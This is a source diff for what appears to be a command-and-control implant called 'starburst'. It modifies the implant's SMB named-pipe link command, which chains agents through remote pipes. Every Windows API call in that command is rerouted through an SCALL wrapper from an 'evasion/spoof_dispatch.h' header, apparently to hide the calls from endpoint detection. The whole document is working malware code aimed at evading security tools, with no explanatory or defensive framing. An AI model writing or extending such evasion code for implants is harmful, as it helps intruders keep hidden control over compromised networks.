@@ -6,6 +6,7 @@
 #include <strings.h>
 #include <base64.h>
 #include <crypto.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_LINK
 
@@ -22,13 +23,13 @@ static auto declfn link_pipe_recv(
     *len  = 0;
 
     DWORD avail = 0;
-    if ( !inst.kernel32.PeekNamedPipe( pipe, nullptr, 0, nullptr, &avail, nullptr ) )
+    if ( !SCALL( inst, kernel32.PeekNamedPipe, pipe, nullptr, 0, nullptr, &avail, nullptr ) )
         return false;
     if ( avail == 0 ) return false;
 
     uint8_t header[4] = {};
     DWORD   read_bytes = 0;
-    if ( !inst.kernel32.ReadFile( pipe, header, 4, &read_bytes, nullptr ) || read_bytes != 4 )
+    if ( !SCALL( inst, kernel32.ReadFile, pipe, header, 4, &read_bytes, nullptr ) || read_bytes != 4 )
         return false;
 
     uint32_t msg_size = ((uint32_t)header[0] << 24) |
@@ -47,9 +48,9 @@ static auto declfn link_pipe_recv(
         if ( chunk > PIPE_BUFFER_MAX ) chunk = PIPE_BUFFER_MAX;
 
         read_bytes = 0;
-        BOOL ok = inst.kernel32.ReadFile( pipe, buf + total_read, chunk, &read_bytes, nullptr );
+        BOOL ok = (BOOL)SCALL( inst, kernel32.ReadFile, pipe, buf + total_read, chunk, &read_bytes, nullptr );
         if ( !ok ) {
-            DWORD err = inst.kernel32.GetLastError();
+            DWORD err = (DWORD)SCALL( inst, kernel32.GetLastError );
             if ( err == ERROR_MORE_DATA ) {
                 total_read += read_bytes;
                 continue;
@@ -78,7 +79,7 @@ static auto declfn link_pipe_send(
     header[3] = len & 0xFF;
 
     DWORD written = 0;
-    if ( !inst.kernel32.WriteFile( pipe, header, 4, &written, nullptr ) || written != 4 )
+    if ( !SCALL( inst, kernel32.WriteFile, pipe, header, 4, &written, nullptr ) || written != 4 )
         return false;
 
     uint32_t offset = 0;
@@ -87,7 +88,7 @@ static auto declfn link_pipe_send(
         if ( chunk > PIPE_BUFFER_MAX ) chunk = PIPE_BUFFER_MAX;
 
         written = 0;
-        if ( !inst.kernel32.WriteFile( pipe, data + offset, chunk, &written, nullptr ) )
+        if ( !SCALL( inst, kernel32.WriteFile, pipe, data + offset, chunk, &written, nullptr ) )
             return false;
         offset += written;
     }
@@ -141,7 +142,7 @@ auto declfn starburst::cmd_link(
 
     DBG_PRINT( inst, "link: connecting to %s\n", pipe_path );
 
-    HANDLE h_remote = inst.kernel32.CreateFileA(
+    HANDLE h_remote = (HANDLE)SCALL( inst, kernel32.CreateFileA,
         pipe_path,
         GENERIC_READ | GENERIC_WRITE,
         0,
@@ -165,7 +166,7 @@ auto declfn starburst::cmd_link(
         inst.heap_alloc( sizeof( instance::SmbLink ) )
     );
     if ( !link ) {
-        inst.kernel32.CloseHandle( h_remote );
+        SCALL( inst, kernel32.CloseHandle, h_remote );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
         return;
@@ -174,7 +175,7 @@ auto declfn starburst::cmd_link(
     memory::zero( link, sizeof( instance::SmbLink ) );
     memory::copy( link->task_uuid, task_uuid, 36 );
 
-    link->link_id   = inst.kernel32.GetTickCount() & 0x7FFFFFFF;
+    link->link_id   = (DWORD)SCALL( inst, kernel32.GetTickCount ) & 0x7FFFFFFF;
     link->h_pipe    = h_remote;
     link->connected = true;
 
@@ -195,7 +196,7 @@ auto declfn starburst::cmd_link(
     }
 
     if ( !p2p_data || p2p_len == 0 ) {
-        inst.kernel32.CloseHandle( h_remote );
+        SCALL( inst, kernel32.CloseHandle, h_remote );
         if ( link->pipe_name ) inst.heap_free( link->pipe_name );
         inst.heap_free( link );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
